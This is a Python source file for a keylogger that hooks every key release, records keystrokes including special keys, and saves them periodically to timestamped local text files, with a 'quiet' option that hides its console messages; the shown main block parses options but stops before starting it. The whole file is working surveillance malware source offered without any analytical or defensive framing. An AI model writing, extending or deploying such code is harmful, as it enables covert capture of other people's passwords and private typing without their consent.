import keyboard
from threading import Timer
from datetime import datetime
from optparse import OptionParser

class Keylogger:
    def __init__(self, interval, hidden=False) -> None:
        self.interval = interval
        self.log = ""
        self.isHidden = hidden
    
    def callback(self, event):
        """
        Invoked after every time a key is released.
        """
        
        special_keys = {
            "space" : " ",
            "enter" : "[ENTER]\n",
            "decimal" : ".",
            "shift" : ""
        }
        
        name = event.name
        if(len(name)>1): # If the key released is not a character
            if name in special_keys.keys():
                name = special_keys[name]
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
                
        self.log += name
        
    def createfilename(self):
        self.filename = f"keylog-{str(datetime.now())[:-7].replace(' ', '_').replace(':', '')}"
        
    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
            
            if not self.isHidden:
                print(f"[+] Saved {self.filename}.txt")
            
    def report(self):
        if self.log:
            self.createfilename()
            self.report_to_file()
        self.log = ""
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        
    def start(self):
        
        if not self.isHidden:
            print("Keylog started")
        
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()
        
if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-i", "--interval", dest="interval", help="the interval at which a keylog is to be saved (in seconds)")   # Interval Variable
    parser.add_option("-q", "--quiet", dest="isHidden", default=False, help="don't print messages to stdout")
    (options, args) = parser.parse_args()